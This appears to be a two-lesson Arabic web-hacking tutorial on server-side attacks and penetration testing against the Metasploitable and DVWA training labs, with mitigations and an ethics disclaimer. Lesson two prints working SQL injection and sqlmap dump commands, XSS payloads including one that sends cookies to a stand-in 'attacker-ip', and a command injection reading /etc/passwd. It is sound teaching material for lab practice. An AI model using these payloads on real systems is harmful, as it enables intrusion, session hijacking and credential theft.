

```
     _____           _____                  _____  _     _      
    /  ___|         / ____|                |  __ \(_)   | |     
    \ `--.  ___ _ _| (___   ___ _ ____   _| |  | |_  __| | ___ 
     `--. \/ _ \ '__\___ \ / _ \ '__\ \ / / |  | | |/ _` |/ _ \
    /\__/ /  __/ |  ____) |  __/ |   \ V /| |__| | | (_| |  __/
    \____/ \___|_| |_____/ \___|_|    \_/ |_____/|_|\__,_|\___|
                                                           
          _    _   _             _          
         / \  | |_| |_ __ _  ___| | _____   
        / _ \ | __| __/ _` |/ __| |/ / __|  
       / ___ \| |_| || (_| | (__|   <\__ \  
      /_/   \_\\__|\__\__,_|\___|_|\_\___/  
                                           
```

## مقدمة

مرحباً بكم في الدرس الأول من سلسلة اختراق المواقع الإلكترونية. في هذا الدرس، سنتعرف على مفهوم هجمات جانب الخادم (Server Side Attacks) وسنتعمق في تقنيات اختبار اختراق تطبيقات الويب (Web App Penetration Testing).

## ما هي هجمات جانب الخادم (Server Side Attacks)؟

هجمات جانب الخادم هي نوع من الهجمات التي تستهدف الخوادم والتطبيقات التي تعمل عليها، بدلاً من استهداف المستخدم النهائي. هذه الهجمات يمكن أن تكون خطيرة جداً لأنها تستهدف البنية التحتية الأساسية للموقع الإلكتروني.

### أنواع هجمات جانب الخادم:

1. **حقن SQL (SQL Injection)** - استغلال ثغرات في قواعد البيانات للوصول إلى معلومات غير مصرح بها
2. **هجمات حقن الأوامر (Command Injection)** - تنفيذ أوامر نظام التشغيل على الخادم
3. **هجمات تجاوز المسار (Path Traversal)** - الوصول إلى ملفات خارج المجلد العام للويب
4. **هجمات تضمين الملفات (File Inclusion)** - تضمين ملفات ضارة من الخادم أو من مصادر خارجية
5. **تجاوز مصادقة XML (XXE)** - استغلال معالجات XML لقراءة ملفات النظام

## اختبار اختراق تطبيقات الويب (Web App Penetration Testing)

اختبار اختراق تطبيقات الويب هو عملية منهجية لاكتشاف نقاط الضعف في تطبيقات الويب وتقييم مستوى الأمان العام. يتضمن هذا النوع من الاختبارات محاكاة هجمات حقيقية بهدف تحديد الثغرات الأمنية قبل أن يتمكن المهاجمون الحقيقيون من استغلالها.

### مراحل اختبار اختراق تطبيقات الويب:

#### 1. جمع المعلومات (Information Gathering)
- فحص بنية الموقع والتكنولوجيا المستخدمة
- تحديد نقاط الدخول المحتملة
- استخدام أدوات مثل Nmap و Shodan و WhatWeb

#### 2. تحليل الثغرات (Vulnerability Assessment)
- فحص الموقع بحثًا عن ثغرات معروفة
- تحليل نتائج الفحص الأولي
- استخدام أدوات مثل Nikto و OWASP ZAP و Burp Suite

#### 3. استغلال الثغرات (Exploitation)
- محاولة استغلال الثغرات المكتشفة
- تحديد مدى خطورة كل ثغرة
- توثيق طرق الاستغلال

#### 4. ما بعد الاستغلال (Post-Exploitation)
- تقييم الضرر المحتمل
- محاولة الوصول إلى أنظمة أخرى (الانتقال الجانبي)
- جمع معلومات إضافية

#### 5. التقرير (Reporting)
- توثيق جميع الثغرات المكتشفة
- تقديم توصيات للإصلاح
- تحديد أولويات الإصلاح بناءً على الخطورة

## أدوات اختبار اختراق تطبيقات الويب

1. **Burp Suite** - أداة شاملة لاختبار أمان تطبيقات الويب
2. **OWASP ZAP** - أداة مفتوحة المصدر لاختبار أمان تطبيقات الويب
3. **Sqlmap** - أداة متخصصة في اكتشاف واستغلال ثغرات حقن SQL
4. **Nikto** - ماسح ثغرات الويب
5. **Metasploit** - إطار عمل لاختبار الاختراق

## الأهمية والتطبيقات

يعد اختبار اختراق تطبيقات الويب جزءًا أساسيًا من دورة حياة تطوير البرمجيات الآمنة (SDLC). من خلال إجراء اختبارات منتظمة، يمكن للمؤسسات:

- تحديد نقاط الضعف قبل استغلالها من قبل المهاجمين
- تلبية متطلبات الامتثال التنظيمي مثل PCI DSS و HIPAA
- حماية بيانات المستخدمين والحفاظ على ثقتهم
- تقليل تكاليف الإصلاح على المدى الطويل

## خلاصة

في هذا الدرس، تعرفنا على مفهوم هجمات جانب الخادم وأهمية اختبار اختراق تطبيقات الويب. في الدرس القادم، سننتقل إلى التطبيق العملي ونتعلم كيفية اختراق المواقع باستخدام بيئة Metasploitable، وسنقوم بتنفيذ هجمات مختلفة مثل حقن SQL وXSS.

تذكر أن الهدف من تعلم هذه التقنيات هو تحسين أمان المواقع وليس إلحاق الضرر بالآخرين. استخدم هذه المعرفة بمسؤولية وفقط على الأنظمة المصرح لك باختبارها.



```
 __          __  _       _____  _ _         
 \ \        / / | |     |  __ \(_) |        
  \ \  /\  / /__| |__   | |  | |_| |_ ___   
   \ \/  \/ / _ \ '_ \  | |  | | | __/ _ \  
    \  /\  /  __/ |_) | | |__| | | ||  __/  
     \/  \/ \___|_.__/  |_____/|_|\__\___|  
  _    _            _    _                  
 | |  | |          | |  (_)                 
 | |__| | __ _  ___| | ___ _ __   __ _      
 |  __  |/ _` |/ __| |/ / | '_ \ / _` |     
 | |  | | (_| | (__|   <| | | | | (_| |     
 |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |     
                                  __/ |     
                                 |___/      
```

## مقدمة

مرحباً بكم في الدرس الثاني من سلسلة اختراق المواقع الإلكترونية. بعد أن تعرفنا في الدرس السابق على مفهوم هجمات جانب الخادم (Server Side Attacks)، سننتقل الآن إلى التطبيق العملي باستخدام بيئة Metasploitable، وهي بيئة مُعدة خصيصاً للتدريب على اختبار الاختراق.

## بيئة Metasploitable

Metasploitable هي نظام تشغيل Linux افتراضي مبني على Ubuntu، تم تصميمه خصيصاً ليكون ضعيفاً أمنياً لأغراض التدريب على اختبار الاختراق. تحتوي هذه البيئة على العديد من الخدمات والتطبيقات الضعيفة التي يمكن استغلالها باستخدام أدوات مختلفة.

### المواقع والتطبيقات داخل Metasploitable

تحتوي بيئة Metasploitable على عدة تطبيقات ويب ضعيفة يمكن استخدامها للتدريب:

1. **DVWA (Damn Vulnerable Web Application)** - تطبيق مصمم خصيصاً ليكون ضعيفاً أمام هجمات الويب الشائعة
2. **Mutillidae** - تطبيق ويب به ثغرات متعددة، تغطي قائمة OWASP Top 10
3. **WebDAV** - خدمة تتيح إدارة الملفات عبر بروتوكول HTTP
4. **phpMyAdmin** - واجهة إدارة قواعد بيانات MySQL
5. **TWiki** - نظام ويكي به ثغرات معروفة

## هجمات حقن SQL (SQL Injection)

هجوم حقن SQL هو أحد أكثر تقنيات اختراق تطبيقات الويب انتشاراً وخطورة. يستغل هذا الهجوم ضعفاً في معالجة استعلامات قواعد البيانات، مما يسمح للمهاجم بحقن أوامر SQL خبيثة.

### تعريف SQL Injection

هجوم حقن SQL هو تقنية إدخال رمز SQL ضار في استعلامات قاعدة البيانات من خلال إدخال بيانات من العميل إلى التطبيق. يمكن أن يؤدي هذا إلى:

- الوصول غير المصرح به إلى البيانات
- تعديل البيانات أو حذفها
- تنفيذ أوامر على نظام التشغيل في بعض الحالات

### خطوات تنفيذ هجوم SQL Injection على Metasploitable

1. **اكتشاف الثغرة**:
   - أدخل علامة اقتباس فردية (`'`) في حقول إدخال البيانات
   - راقب رسائل الخطأ التي قد تكشف معلومات عن بنية قاعدة البيانات

2. **استكشاف بنية قاعدة البيانات**:
   ```sql
   ' OR 1=1 --
   ' UNION SELECT 1,2,3,4,5 --
   ' UNION SELECT table_name, column_name, 3, 4, 5 FROM information_schema.columns --
   ```

3. **استخراج البيانات**:
   ```sql
   ' UNION SELECT username, password, email, 4, 5 FROM users --
   ```

4. **استخدام أداة SQLmap**:
   ```bash
   sqlmap -u "http://metasploitable-ip/mutillidae/index.php?page=login.php" --forms --dbs
   sqlmap -u "http://metasploitable-ip/mutillidae/index.php?page=login.php" --forms -D [database_name] --tables
   sqlmap -u "http://metasploitable-ip/mutillidae/index.php?page=login.php" --forms -D [database_name] -T [table_name] --dump
   ```

## هجمات XSS (Cross-Site Scripting)

XSS هي ثغرة أمنية تسمح للمهاجمين بحقن نصوص برمجية (عادة JavaScript) في صفحات يشاهدها مستخدمون آخرون. هذا يمكن أن يؤدي إلى سرقة الجلسات، وتشويه مظهر المواقع، وتوجيه المستخدمين إلى مواقع ضارة.

### أنواع هجمات XSS

1. **Stored XSS (المخزنة)** - حيث يتم تخزين النص البرمجي الضار في قاعدة بيانات الموقع ويتم تنفيذه عندما يزور المستخدمون الصفحة المتأثرة
2. **Reflected XSS (المنعكسة)** - حيث يتم تضمين النص البرمجي الضار في طلب الويب ثم ينعكس على المستخدم
3. **DOM-based XSS** - حيث تحدث الثغرة في DOM بدلاً من كود الخادم

### خطوات تنفيذ هجوم XSS على Metasploitable

1. **اكتشاف الثغرة**:
   - أدخل رمز HTML بسيط مثل `<b>test</b>` في حقول الإدخال
   - إذا ظهر النص بشكل غامق، فهذا يشير إلى وجود ثغرة XSS محتملة

2. **تنفيذ هجوم XSS بسيط**:
   ```html
   <script>alert('XSS')</script>
   ```

3. **سرقة كعكات الجلسة (Session Cookies)**:
   ```html
   <script>fetch('http://attacker-ip/?cookie='+document.cookie)</script>
   ```

4. **تغيير مظهر الصفحة**:
   ```html
   <script>document.body.style.background='black';document.body.style.color='green';</script>
   ```

## تطبيق عملي: استغلال ثغرات DVWA في Metasploitable

DVWA هو تطبيق مثالي للتدرب على تقنيات الاختراق. إليك خطوات استغلال بعض الثغرات الموجودة فيه:

### 1. الوصول إلى DVWA

1. افتح المتصفح وأدخل عنوان IP الخاص بـ Metasploitable، متبوعاً بـ `/dvwa`
2. سجل الدخول باستخدام اسم المستخدم `admin` وكلمة المرور `password`
3. اضبط مستوى الصعوبة على "Low" من صفحة الإعدادات

### 2. استغلال ثغرة SQL Injection

1. انتقل إلى صفحة "SQL Injection"
2. أدخل `' OR '1'='1` في حقل المعرف (ID)
3. لاحظ أن النظام يعرض جميع المستخدمين

### 3. استغلال ثغرة XSS (Stored)

1. انتقل إلى صفحة "XSS (Stored)"
2. أدخل `<script>alert(document.cookie)</script>` في حقل الرسالة
3. أرسل الرسالة وشاهد كيف يتم تنفيذ النص البرمجي في كل مرة يتم فيها زيارة الصفحة

### 4. استغلال ثغرة Command Injection

1. انتقل إلى صفحة "Command Injection"
2. أدخل `127.0.0.1; cat /etc/passwd` في حقل IP
3. لاحظ أن النظام ينفذ الأمر `cat /etc/passwd` ويعرض محتويات الملف

## الحماية والوقاية

بعد التعرف على كيفية استغلال هذه الثغرات، من المهم أن نفهم كيفية الحماية منها:

1. **للحماية من SQL Injection**:
   - استخدام الاستعلامات المعدة مسبقاً (Prepared Statements)
   - تنقية مدخلات المستخدم
   - تطبيق مبدأ أقل صلاحيات ممكنة

2. **للحماية من XSS**:
   - ترميز مخرجات HTML
   - استخدام سياسة أمان المحتوى (Content Security Policy)
   - تنقية مدخلات المستخدم

3. **للحماية من Command Injection**:
   - تجنب استخدام أوامر النظام مباشرة
   - التحقق من صحة المدخلات بشكل صارم
   - استخدام قوائم السماح بدلاً من قوائم المنع

## خلاصة

في هذا الدرس، تعلمنا كيفية استغلال ثغرات أمنية شائعة في تطبيقات الويب باستخدام بيئة Metasploitable. تذكر أن الهدف من تعلم هذه التقنيات هو فهم كيفية حماية التطبيقات وليس إلحاق الضرر بالآخرين.

في الدروس القادمة، سنتعمق أكثر في تقنيات متقدمة لاختبار اختراق تطبيقات الويب، بما في ذلك استخدام أدوات متخصصة مثل Burp Suite وتقنيات متقدمة للتحايل على آليات الحماية.












# تحذير وتذكير بالمسؤولية الأخلاقية

```
  ██████╗ █████╗ ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
 ██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
 ██║     ███████║██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
 ██║     ██╔══██║██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
 ╚██████╗██║  ██║╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
  ╚═════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
                                                        
 ███████╗████████╗██╗  ██╗██╗ ██████╗ █████╗ ██╗         
 ██╔════╝╚══██╔══╝██║  ██║██║██╔════╝██╔══██╗██║         
 █████╗     ██║   ███████║██║██║     ███████║██║         
 ██╔══╝     ██║   ██╔══██║██║██║     ██╔══██║██║         
 ███████╗   ██║   ██║  ██║██║╚██████╗██║  ██║███████╗    
 ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝    
                                                        
 ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
 ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
 ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
 ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
 ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
```

## إخلاء المسؤولية والالتزام الأخلاقي

### ⚠️ تحذير هام ⚠️

المعلومات والتقنيات المقدمة في هذه الدروس هي **لأغراض تعليمية فقط**. إساءة استخدام هذه المعلومات قد يؤدي إلى:

- انتهاك القوانين المحلية والدولية
- المسؤولية القانونية والجنائية
- أضرار مالية وسمعية للمؤسسات والأفراد

### الاستخدام المسؤول والأخلاقي

بصفتك متعلماً في مجال أمن المعلومات، يجب عليك الالتزام بما يلي:

1. **الحصول على إذن كتابي صريح** قبل اختبار أي نظام أو شبكة.
2. **احترام حدود الاختبارات** المتفق عليها وعدم تجاوزها.
3. **توثيق جميع الأنشطة** التي تقوم بها خلال عمليات الاختبار.
4. **الإبلاغ عن الثغرات** للجهات المعنية بطريقة مسؤولة.
5. **عدم استخدام هذه المعرفة** للوصول غير المصرح به إلى البيانات أو الأنظمة.
6. **الالتزام بالقوانين والأنظمة** المعمول بها في بلدك.

### إرشادات الممارسة الآمنة

- استخدم فقط البيئات المخصصة للتدريب مثل Metasploitable أو DVWA.
- قم بإعداد مختبر افتراضي معزول للتدريب.
- لا تختبر مواقع ويب أو أنظمة حقيقية دون إذن صريح.
- تعلم وتابع مبادئ الإفصاح المسؤول عن الثغرات.

### تذكر دائماً

> "مع القوة تأتي المسؤولية الكبيرة."

إن المعرفة التي تكتسبها هنا يمكن أن تكون قوة للحماية أو أداة للضرر. اختر دائماً أن تكون جزءاً من الحل وليس جزءاً من المشكلة.

---

بالمتابعة في هذه الدروس، أنت توافق على استخدام هذه المعرفة بطريقة أخلاقية ومسؤولة وقانونية.



